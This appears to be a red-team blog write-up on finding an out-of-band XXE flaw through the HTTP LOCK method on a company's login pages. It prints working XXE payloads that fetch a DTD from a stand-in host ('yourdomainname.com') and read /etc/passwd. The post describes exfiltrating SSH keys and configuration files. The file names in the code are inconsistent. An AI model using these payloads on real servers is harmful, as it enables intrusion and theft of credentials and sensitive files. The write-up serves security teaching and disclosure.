Hi Everyone 

In this blog ,i will cover one of the intresting vulnerability **Out-Of-Band XXE via HTTP LOCK Method** that i found during the Red Teaming Engagement in a `Product Based Company` and exploited the vulnerability at **Large Scale**.

**How it all started ?**

  Under the Red Teaming Activty there are many category such as Cyber Threat Intelligence, Internal Adversary Simulation, External Adversary Simulation, Social Engineering,Deep Web / Dark Web Exposure, OSINT, Phising etc,.

  This vulnerability was found during the  External Adversary Simulation Category, where we used to test for Web Application and Network Assets to find Critical Server Side bugs so that we can exfiltrate data and get an inital foothold.
  
**Let's Dive Deep into it!**

* There were hundreds of login pages under the web application pentesting part and credentials that was obtained from Deep / Dark Web Exposure were not working :(

</p>

* Found many login pages which was developed by the company to their customers to handle the data between both the parties.

**Step 1:** Intercept the login request using client side proxy like Burp Suite as shown below.

**Step 2:** Started to check for HTTP Methods enabled in the application by using **OPTIONS**

</p>

From the above image , it can be observed that there is no reaction from the application , got the same response we see from **GET** method.

</p>

**Step 3:** When i removed `login.jsp` and supplied a notexisting value (test) it showed up the different HTTP Methods that are allowed in the application.

Note : The allowed methods are OPTIONS, MKCOL, PUT, LOCK.

**Step 4:** Tried **PUT** method and it returned `403 forbidden error`, but when i tried **LOCK** method it showed up some **XML** data as output as shown below.

</p>

**Step 5:** Started to test for different kinds of XXE , ended up with OOB-XXE with basic payload as shown below.

```xml
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://youripaddress.com"> %xxe; ]>
```

<p align="center">

</p>

Note: We got both the **HTTP** and **DNS** hit from the server.

**Step 6:** Since it is an `Out-Of-Band XXE` , follow the below steps to set-up the environment.

**Note :** We need to host the DTD file on a web server. Here, we used a simple web server on the cloud and pointed the domain `yourdomainname.com` to the serverâ€™s public IP address and hosted the file `exploited.dtd` on the server.

Contents of `exploited.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ext "<!ENTITY exfil SYSTEM 'file:///%file;'>">
```

The request body send to the vulnerable URL:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://yourdomainname.com/exploitd.dtd">
%xxe;
%ext;
]>
<foo><u>
&exfil;
</u></foo>
```

**Step 7:** Now the fun begins , we were able to exfiltrate and read different directory files and sensitive information such as **backup file, configuration file, ssh keys and access logs** etc,.
